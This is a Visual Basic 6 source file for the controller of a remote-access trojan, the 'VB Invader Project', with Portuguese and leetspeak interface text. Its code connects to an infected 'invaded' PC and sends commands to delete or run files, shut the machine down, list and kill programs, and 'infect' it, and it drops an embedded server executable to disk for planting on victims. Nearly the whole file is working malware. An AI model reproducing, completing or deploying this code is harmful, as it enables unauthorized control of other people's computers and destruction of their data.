VERSION 5.00
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H0000FF00&
   BorderStyle     =   0  'None
   Caption         =   "7H3 73R@70$ VB 1NV@D3R PR0J3K7"
   ClientHeight    =   8970
   ClientLeft      =   -180
   ClientTop       =   180
   ClientWidth     =   11910
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":43B2
   ScaleHeight     =   8970
   ScaleMode       =   0  'User
   ScaleWidth      =   11910
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin TTVIP.Winsock w2 
      Left            =   1170
      Top             =   3225
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.CommandButton Command14 
      Appearance      =   0  'Flat
      BackColor       =   &H0000C000&
      Caption         =   "Here be the ¢0mm@nd"
      Default         =   -1  'True
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   165
      Left            =   11070
      Style           =   1  'Graphical
      TabIndex        =   25
      Top             =   8715
      Width           =   705
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   330
      Left            =   2490
      TabIndex        =   0
      Top             =   7005
      Width           =   6915
   End
   Begin VB.CommandButton Command23 
      Caption         =   "Visual Basic"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   180
      Left            =   9240
      TabIndex        =   22
      Top             =   5100
      Visible         =   0   'False
      Width           =   75
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Fechar Programa"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   21
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command18 
      Caption         =   "Listar Programas"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   20
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Criar Pasta Personalizada"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   19
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command13 
      Caption         =   "Executar Arquivo"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   18
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Deletar Arquivo"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   17
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Tempo de Uso"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   16
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton cmdctrl 
      Caption         =   "Painel de Controle"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   15
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton cmdchecknet 
      Caption         =   "Checknet"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   14
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command2 
      Caption         =   "DESLIGAR PC"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   13
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton cmdpaint 
      Caption         =   "Paint"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   12
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton cmdcalc 
      Caption         =   "Calculadora"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   11
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton cmdnote 
      Caption         =   "Bloco de notas"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   10
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Limpar Buffer Invadido"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      Style           =   1  'Graphical
      TabIndex        =   9
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Enviar Mensagem"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   8
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Fechar Servidor"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   7
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Criar Pasta"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   6
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton cmdcddoor 
      Caption         =   "Abrir CDROM"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   5
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command6 
      Caption         =   "MS WORD"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   4
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Media Player"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   3
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Scandisk"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   2
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Paciência"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   9240
      TabIndex        =   1
      Top             =   5100
      Visible         =   0   'False
      Width           =   120
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   5670
      Left            =   2475
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   23
      Top             =   1170
      Width           =   6945
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Height          =   840
      Left            =   1065
      TabIndex        =   26
      Top             =   30
      Width           =   9240
   End
   Begin VB.Label Label2 
      Caption         =   "Label2"
      Height          =   450
      Index           =   0
      Left            =   3720
      TabIndex        =   24
      Top             =   5010
      Width           =   1845
   End
   Begin VB.Image Label4 
      Height          =   510
      Left            =   9315
      Top             =   165
      Visible         =   0   'False
      Width           =   555
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Buffer() As Byte
Dim lBytes As Long
Dim mFilesize As Long
Dim Filename As String
Dim buf As String
Dim sckConnected As Boolean
Dim dados As String
Dim dados1 As String
Dim dados2 As String
Dim dados3 As String
Private Sub LogErr()
If err.Number <> 0 Then
If err.Number <> 40006 Then
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "F4T4L 3RR0R: " & err.Description & vbCrLf & "$0URC3: " & err.Source & vbCrLf & "NUMB3R: " & err.Number & vbCrLf & "===============" & vbCrLf
End If
End If
End Sub
Private Sub cmdcalc_Click()

   

    On Error GoTo err_cmdcalc_Click

Dim str As String
str = "calc"
w2.SendData str
    

    Exit Sub

err_cmdcalc_Click:
            LogErr
End Sub

Private Sub cmdcddoor_Click()
On Error GoTo err
Dim str As String
str = "cddooropen"
w2.SendData str
err:
LogErr
End Sub

Private Sub cmdchecknet_Click()

 

    On Error GoTo err_cmdchecknet_Click


Dim str As String
str = "checknet"
w2.SendData str
    

    Exit Sub

err_cmdchecknet_Click:
LogErr
End Sub

Private Sub cmdctrl_Click()
On Error GoTo err
Dim str As String
str = "ctrl"
w2.SendData str
err:
LogErr
End Sub

Private Sub cmdnetclose_Click()
'Dim str As String
'str = "nonet"
'w2.SendData str
End Sub

Private Sub cmdnote_Click()

  

    On Error GoTo err_cmdnote_Click


Dim str As String
str = "note"
w2.SendData str
    

    Exit Sub

err_cmdnote_Click:
    LogErr
End Sub

Private Sub cmdpaint_Click()

    On Error GoTo err_cmdpaint_Click


Dim str As String
str = "pain"
w2.SendData str

    

    Exit Sub

err_cmdpaint_Click:
    LogErr
End Sub

Private Sub Command1_Click()



    On Error GoTo err_Command1_Click


If txtip.Text = "" Then
Me.Caption = "Digite o IP a ser invadido..."
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "Digite o IP a ser invadido..."
Else
w2.Connect txtip.Text, txtPort.Text
End If


    

  
err_Command1_Click:
LogErr
End Sub

Private Sub Command1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
Command1.BorderStyle = 1
Command1.BackColor = &HFFFF00
End Sub

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)

Command1.BorderStyle = 0

Command1.BackColor = &HFFFF&
End Sub

Private Sub Command1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
Command1.BorderStyle = 0

Command1.BackColor = &HFFFF00
End Sub

Private Sub Command10_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite a mensagem a enviar...", "Enviar mensagem ao ´invadido´ ")
Dim str As String
str = "msg " & dados1
w2.SendData str
err:
LogErr
    
End Sub

Private Sub Command11_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite o caminho e o arquivo a deletar no PC Invadido...", "Deletar Arquivo Alheio...")
Dim str As String
str = "del " & dados1
w2.SendData str
err:
LogErr
    
End Sub

Private Sub Command12_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite o nome da pasta a criar...", "Criar Pasta em PC Alheio...")
Dim str As String
str = "mkd " & dados1
w2.SendData str
err:
LogErr
End Sub

Private Sub Command13_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite o caminho e o arquivo a executar no PC Invadido...", "Executar Arquivo Alheio...")
Dim str As String
str = "exe " & dados1
w2.SendData str
err:
LogErr
End Sub


Private Sub Command14_Click()
On Error GoTo er
Dim str As String
Dim pt As String
Dim ori As String
Dim des As String
Dim tem As String
Dim l As Integer
'''''''''''''''''''''COMPLEX STRINGS

If Left$(Text1.Text, 12) = "./copy#file " Then
tem = Right$(Text1.Text, Len(Text1.Text) - 12)
Text2.Text = Text2.Text & vbCrLf & "%STARTING COPY ACTION..."
l = InStr(1, tem, "*", vbTextCompare) - 1
ori = Left$(tem, l)
Text2.Text = Text2.Text & vbCrLf & "!SOURCE: " & ori
des = Right$(tem, Len(tem) - l - 1)
Text2.Text = Text2.Text & vbCrLf & "?DESTINATION: " & des
Text2.Text = Text2.Text & vbCrLf & "#TRYING TO COPY..."
FileCopy ori, des
Text2.Text = Text2.Text & vbCrLf & "##COPY OK!"
buf = Text1.Text
End If

'''''''''''''''''''''''SIMPLE STRINGS

Text2.Text = Text2.Text & vbCrLf & Text1.Text
If Left$(Text1.Text, 17) = "./setremote#port " Then
str = Right$(Text1.Text, Len(Text1.Text) - 17)
w2.RemotePort = str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "REMOTE PORT DEFINED: " & str
buf = Text1.Text
Text1.Text = Empty

Exit Sub

 End If
 If Left$(Text1.Text, 14) = "./me@call?app " Then
str = Right$(Text1.Text, Len(Text1.Text) - 14)
Call Shell(str, vbNormalFocus)
buf = Text1.Text
Text1.Text = Empty
Exit Sub
buf = Text1.Text
Text1.Text = Empty
 End If
  If Left$(Text1.Text, 12) = "./build#dir " Then
str = Right$(Text1.Text, Len(Text1.Text) - 12)
Text2.Text = Text2.Text & vbCrLf & "TRYING TO BUILD A DIRECTORY..."
MkDir str
Text2.Text = Text2.Text & vbCrLf & "DIRECTORY: " & str & " BUILD OK!"
buf = Text1.Text
Text1.Text = Empty
Exit Sub
buf = Text1.Text
Text1.Text = Empty
 End If
  If Left$(Text1.Text, 15) = "./me@auto#copy " Then
  str = Right$(Text1.Text, Len(Text1.Text) - 15)
  Text2.Text = Text2.Text & vbCrLf & vbCrLf & "Starting copy..." & vbCrLf & "COPYING TO: " & str
If Len(App.Path) = 3 Then
pt = App.Path
Else
pt = App.Path & "\"
End If
FileCopy pt & App.EXEName & ".exe", str
Text2.Text = Text2.Text & vbCrLf & vbCrLf & "COPYED IN " & str
buf = Text1.Text
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
 End If
 If Left$(Text1.Text, 31) = "##be@the./garbage*in!workspace " Then
str = Right$(Text1.Text, Len(Text1.Text) - 31)
w2.SendData "infect! " & str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "Making garbage in the otherside PC... " & str
buf = Text1.Text
Text1.Text = Empty
Exit Sub

Text1.Text = Empty
 End If
If Left$(Text1.Text, 11) = "./goto#net " Then
Dim ip As String
ip = Right(Text1.Text, Len(Text1.Text) - 11)
w2.RemoteHost = ip
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "TRYING TO CONNECT TO " & ip
w2.Connect
buf = Text1.Text
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
 End If
'commandS REMOTOS

If Left$(Text1.Text, 4) = "msg " Then
str = Text1.Text
w2.SendData str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
buf = Text1.Text
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

If Left$(Text1.Text, 4) = "cpr " Then
str = Text1.Text
w2.SendData str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
buf = Text1.Text
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

If Left$(Text1.Text, 4) = "exe " Then
str = Text1.Text
w2.SendData str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
buf = Text1.Text
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

If Left$(Text1.Text, 4) = "mkd " Then
str = Text1.Text
w2.SendData str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
buf = Text1.Text
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If
'''''''''''''''''''''''''''
If Left$(Text1.Text, 15) = "./build@server " Then
Dim srvr As String
srvr = Right(Text1.Text, Len(Text1.Text) - 15)
Dim p_ret As String
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open srvr For Binary As #1
Put #1, , p_ret
Text2.Text = Text2.Text & vbCrLf & "Building server..."
Close #1
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "SERVER CREATED IN: " & srvr
buf = Text1.Text
 Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If
''''''''''''
If Left$(Text1.Text, 4) = "del " Then
str = Text1.Text
w2.SendData str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "command " & Chr(34) & str & Chr(34) & " sent!!"
buf = Text1.Text
Text1.Text = Empty
 Exit Sub
 Text1.Text = Empty
End If

Select Case Text1.Text
Case Is = "end"
End
Case Is = "calc"
cmdcalc_Click
buf = Text1.Text
Text1.Text = Empty
 Exit Sub
 buf = Text1.Text
 Text1.Text = Empty
Case Is = "notepad"

cmdnote_Click
buf = Text1.Text
Text1.Text = Empty
Exit Sub
buf = Text1.Text
Text1.Text = Empty
Case Is = "clr$creen"
buf = Text1.Text
Text2.Text = Empty
Text1.Text = Empty
Exit Sub
buf = Text1.Text
Text1.Text = Empty
Case Is = "serverpath"
buf = Text1.Text
cmdchecknet_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "shutdown"
buf = Text1.Text
Text1.Text = Empty
Command2_Click
Exit Sub
Text1.Text = Empty
Case Is = "ctrpanel"
buf = Text1.Text
Text1.Text = Empty
cmdctrl_Click
Exit Sub
Text1.Text = Empty
Case Is = "time"
buf = Text1.Text
Text1.Text = Empty
Command9_Click
Exit Sub
Text1.Text = Empty
Case Is = "closeserver"
buf = Text1.Text
str = "closeme"
w2.SendData str
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "cdopen"
buf = Text1.Text
cmdcddoor_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "solitarie"
buf = Text1.Text
Command3_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "./Show#me?the$commands"
buf = Text1.Text
Text2.Text = Text2.Text & vbCrLf & vbCrLf & "**1nV@d3R C0mM@nD$**" _
& vbCrLf & "end = CLOSE ME" _
& vbCrLf & "notepad = OPENS THE SERVER NOTEPAD" _
& vbCrLf & "serverpath = SHOWS THE SERVER LOCATE PATH" _
& vbCrLf & "shutdown = SHUTDOWNS THE SERVERS PC" _
& vbCrLf & "ctrpanel = OPENS THE SERVER CONTROL PANNEL" _
& vbCrLf & "time = SHOWS THE TIME OF SERVERS PC IS ON" _
& vbCrLf & "closeserver = CLOSES THE SERVER" _
& vbCrLf & "./me@auto#copy = AUTO COPY ME!" _
& vbCrLf & "##be@the./garbage*in!workspace = TRASH THE OTHERSIDE PC INFECTING THEM!" _
& vbCrLf & "cdopen = OPENS THE SERVER CDROM TRAY" _
& vbCrLf & "solitarie = OPENS THE SERVER SOLITARIE" _
& vbCrLf & "./setremote#port ? = CHANGE THE ? TO THE SELECTED PORT TO CONNECT" _
& vbCrLf & "./goto#net ? = CHANGE THE ? TO THE SELECTED HOST IP TO CONNECT" _
& vbCrLf & "msg = SEND A MESSANGE TO SERVER" _
& vbCrLf & "./me@call?app = CALL AN APP HERE" _
& vbCrLf & "./copy#file SOURCE*DESTINATION = COPY FILE$" _
& vbCrLf & "./build#dir = BUILD A DIR" _
& vbCrLf & "./build@server ? = Creates a server in typed location" _
& vbCrLf & "cpr = CLOSES A PROGRAM IN THE SERVER" _
& vbCrLf & "exe = CALLS A PROGRAM IN THE SERVER" _
& vbCrLf & "del = KILLS A PROGRAM IN THE SERVER" _
& vbCrLf & "mkd = MAKE A PERSONAL PATH IN THE SERVER"
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "lstapp"
buf = Text1.Text
Text1.Text = Empty
Command18_Click
Exit Sub
Text1.Text = Empty
Case Is = "msword"
buf = Text1.Text
Text1.Text = Empty
Command6_Click
Exit Sub
Text1.Text = Empty
Case Is = "scandisk"
buf = Text1.Text
Text1.Text = Empty
Command4_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "mplaya"
buf = Text1.Text
Command5_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "vb6"
buf = Text1.Text
Command23_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "dir"
buf = Text1.Text
Command7_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "paint"
buf = Text1.Text
cmdpaint_Click
Text1.Text = Empty
Exit Sub
Text1.Text = Empty
Case Is = "./sock#close"
buf = Text1.Text
Text1.Text = Empty
w2.CloseSck
Exit Sub
Text1.Text = Empty
End Select
w2.SendData Text1.Text
Text1.Text = Empty
er:
LogErr
End Sub



Private Sub Command16_Click()
On Error GoTo err
Dim str As String
str = Empty
w2.SendData str
err:
LogErr
End Sub

Private Sub Command16_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Command1.BackColor = &H8080FF
End Sub

Private Sub Command17_Click()
Dim nome As String
Dim p_ret As String
nome = "C:\Invasor.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
MsgBox "Arquivo criado em: " & Chr(34) & nome & Chr(34) & " com SUCESSO!", vbInformation, Me.Caption
End Sub

Private Sub Command18_Click()
On Error GoTo err
Dim str As String
str = "lstexe"
w2.SendData str
err:
LogErr
End Sub


Private Sub Command2_Click()

    

    On Error GoTo err_Command2_Click


Dim str As String
str = "shutdown"
w2.SendData str
    

    Exit Sub

err_Command2_Click:
    LogErr
End Sub


Private Sub Command23_Click()
On Error GoTo err
Dim str As String
str = "vb6"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command24_Click()
On Error Resume Next
Dim str As String
str = "shutxp"
w2.SendData str
    

End Sub

Private Sub Command3_Click()
On Error GoTo err
Dim str As String
str = "sol"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command4_Click()
On Error GoTo err
Dim str As String
str = "scan"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command5_Click()
On Error GoTo err
Dim str As String
str = "mplayer"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command6_Click()
On Error GoTo err
Dim str As String
str = "word"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command7_Click()
On Error GoTo err
Dim str As String
str = "dir"
w2.SendData str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "##PATH C:\PC Invadido criada no servidor: " & w2.RemoteHost & vbCrLf & "===============" & vbCrLf
err:
LogErr
End Sub

Private Sub Command8_Click()
On Error GoTo err
If MsgBox("##?DO YOU WANT TO GO AWAY?", vbYesNo, Me.Caption) = vbYes Then
Dim str As String
str = "closeme"
w2.SendData str
Me.Caption = "Disconnected"
End If
err:
LogErr
End Sub

Private Sub Command9_Click()
On Error GoTo err
Dim str As String
str = "wintime"
w2.SendData str
err:
LogErr
End Sub

Private Sub Form_Load()
On Error GoTo err
If App.PrevInstance = True Then Unload Me
Set m_Rgn = New CBMPRegion
  m_Rgn.CreateFromPic Me.Picture, vbBlack
  SetWindowRgn hwnd, m_Rgn.Handle, True
Text2.Text = Text2.Text & vbCrLf & "##7H3 73R@70$ VB 1NV@D3R PR0J3K7##"
Text2.Text = Text2.Text & vbCrLf & "##CR3473D BY 7£R@bY7£##"
Text2.Text = Text2.Text & vbCrLf & vbCrLf & Time & vbCrLf & "##R3m0t3 $3rv3r $taTu$: DISCONNECTED##" & vbCrLf & "#############" & vbCrLf
Text2.Text = Text2.Text & vbCrLf & "##MY IP IS: " & w2.LocalIP & "##"
w2.RemotePort = 23
sckConnected = False
Clipboard.SetText "./Show#me?the$commands"
err:
LogErr
End Sub
Private Sub Form_LostFocus()
Command1.BackColor = &H8080FF
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Command8_Click
End Sub
Private Sub Frame1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Command1.BackColor = &H8080FF
End Sub
Private Sub Label4_Click()
On Error Resume Next
Dim str As String
str = "closeme"
w2.SendData str
Unload Me
 End Sub
Private Sub Socket_ConnectionRequest(ByVal requestID As Long)
On Error GoTo err
If Socket.State <> sckClosed Then
Socket.Close
End If
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "LAMMER TRYING TO CONNECT..."
Socket.Accept requestID
MsgBox "PREGO conectado. IP - " & Socket.RemoteHostIP
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & "##?LAMMER CONNECTED - IP:" & Socket.RemoteHostIP
txtip.Text = Socket.RemoteHostIP
err:
LogErr
End Sub

Private Sub Text1_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = 38 Then
If buf <> Empty Then Text1.Text = buf
End If
If KeyCode = 40 Then Text1 = Empty
End Sub

Private Sub Text2_Change()
Text2.SelStart = Len(Text2.Text)
End Sub
Private Sub w2_Connect()
Text2.Text = Text2.Text & vbCrLf & "##R3m0t3 PC InvAd3D: " & w2.RemoteHostIP & " at " & Time
End Sub

Private Sub w2_DataArrival(ByVal bytesTotal As Long)
    On Error GoTo err_w2_DataArrival
Dim str As String
w2.GetData str
Text2.Text = Text2.Text & vbCrLf & Time & vbCrLf & str
err_w2_DataArrival:
            LogErr
End Sub
